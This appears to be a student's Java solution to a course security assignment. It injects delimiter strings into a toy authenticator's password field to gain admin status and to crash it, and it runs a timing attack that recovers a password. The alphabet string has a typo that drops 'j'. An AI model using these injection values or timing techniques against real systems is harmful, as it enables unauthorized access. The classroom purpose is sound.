package edu.brandeis.cs12b.pa9;

import sample.PasswordGenerator;

public class Hacks {

	private final String checkList="0123456789abcdefghigklmnopqrstuvwxyz";
	/**
	 * This main method might be useful for debugging. It tests both of your hacks
	 * and prints the results to the console.
	 * 
	 * @param args not used
	 */
	public static void main(String[] args) {
		Hacks h = new Hacks();		
		System.out.println("Calling hack1...");
		UserAuthenticator auth = new UserAuthenticator();
		
		h.hack1(auth);
		System.out.println("Result of logging in as Eliot with password 1234: " + auth.authenticateUser("Eliot", "1234"));
		//System.out.println("Result of logging in as Bob: " + auth.authenticateUser("Bob", "test"));
		System.out.println();
		
		System.out.println("Calling hack2...");
		auth = new UserAuthenticator();
		h.hack2(auth);
		try {
			auth.authenticateUser("Bob", "test");
			System.out.println("User authenticator still working...");
		} catch (Exception e) {
			System.out.println("User authenticator is broken!");
		}
		System.out.println();

		
		System.out.println("Calling timingAttack...");
		PasswordGenerator password = new PasswordGenerator();
		System.out.println("Initial password is 0000");

		// Generated passwords will contain digits and letters
		password.setDigitsAndLowercaseLetters();
		// Generated passwords will contain digits only
//		password.setDigitsOnly();
		
		// Generated passwords will contain 2 characters
		password.setPasswordLength(5);
		// Generate a random password
		password.setRandomPassword();
//		for (int i = 0; i < 999; i++) {
//			if (password.checkPassword(Integer.toString(i))) {
//				System.out.println("Found password:" + Integer.toString(i));
//			}
//		}
		String p=h.timingAttack(password);
		System.out.println(p);
	}
	
	/**
	 * For the first hack, you'll use the UserAuthenticator::addRegularUser method
	 * in order to add a user with "admin" status. Think about how the addRegularMethod works.
	 * 
	 * This method should make it so that a subsequent call to authenticateUser("Eliot", "1234")
	 * will return "admin".
	 * 
	 * @param auth the UserAuthenticator object to hack
	 */
	public void hack1(UserAuthenticator auth) {
		auth.addRegularUser("Eliot", "1234//admin&&Eliot//1234");
	}
	
	/**
	 * For the second hack, you'll use the UserAuthenticator::addRegularUser method
	 * in order to completely break the authenticator, so it throws an exception instead of
	 * properly returning.
	 * 
	 * @param auth the UserAuthenticator object to break
	 */
	public void hack2(UserAuthenticator auth) {
		auth.addRegularUser("Bob", "&&");
	}
	
	/**
	 * exploit the Timing Attack and return the correct password.
	 * 
	 * @param pass the PasswordGenerator object
	 * @return correct password
	 */
	public String timingAttack(PasswordGenerator pass) {
		StringBuilder sb=new StringBuilder();
		String check=null;
		//boolean tmp=false;
		int l=pass.getLength();
		while(sb.length()<l-1) {
			for(int i=0;i<checkList.length();i++) {
				check=generateCheckPass(sb.toString()+checkList.charAt(i),l);
				if(timeChecking(check,pass,sb.length())) {
					sb.append(checkList.charAt(i));
					//System.out.println(sb.toString());
					break;
				}
			}
//			//check for digits
//			for(int i=0;i<=9;i++) {
//				check=generateCheckPass(sb.toString()+Integer.toString(i),l);
//				tmp=timeChecking(check,pass,sb.length());
//				if(tmp) {
//					//System.out.println("append"+Integer.toString(i));
//					sb.append(Integer.toString(i));
//					break;
//				}
//			}
//			//check for chars
//			if(!tmp) {
//
//				for(char ch='a';ch<='z';ch++) {
//					check=generateCheckPass(sb.toString()+ch,l);
//					tmp=timeChecking(check,pass,sb.length());
//					if(tmp) {
//						sb.append(ch);
//					}
//				}
//			}
		}
		sb.append(checkForLastDigit(sb.toString(),pass));
		return sb.toString();
	}
	
	/**
	 * generate a potential full digits password
	 * @param check
	 * @param l
	 * @return potential pass, with last few digits filled with 0 
	 */
	public String generateCheckPass(String check,int l) {
		while(check.length()<l) {
			check=check+"0";
		}
		return check;
	}
	/**
	 * check whether the iteration time is larger than 20+10*l
	 * @param check
	 * @param pass
	 * @return null or non-null
	 */
	public boolean timeChecking(String check,PasswordGenerator pass,int l) {
		long startTime,stopTime,elapsedTime = 0;
		for(int i=0;i<5;i++) {
			startTime = System.currentTimeMillis();
			pass.checkPassword(check);
			stopTime = System.currentTimeMillis();
			elapsedTime= elapsedTime + stopTime - startTime;
			//System.out.println("elapsedTime"+elapsedTime);
			if(elapsedTime>=(10*l+20)*5) {
				return true;
			}
		}
		return false;
	}
	/**
	 * brute force checking last digit
	 * @param check
	 * @param pass
	 * @return
	 */
	public String checkForLastDigit(String check,PasswordGenerator pass) {
		for(int i=0;i<checkList.length();i++) {
			if(pass.checkPassword(check+checkList.charAt(i))) {
				System.out.println("Found password!" );
				return Character.toString(checkList.charAt(i));
			}
		}
//		boolean tmp=false;
//		for (int i = 0; i < 9; i++) {
//			if (pass.checkPassword(check+Integer.toString(i))) {
//				System.out.println("Found password!" );
//				tmp=true;
//				return Integer.toString(i);
//			}
//		}
//		if(!tmp) {
//			for(char ch='a';ch<='z';ch++) {
//				if(pass.checkPassword(check+ch)) {
//					System.out.println("Found password!" );
//					return Character.toString(ch);
//				}
//			}
//		}
		System.out.println("Did not find password..." );
		return null;
		
	}
}
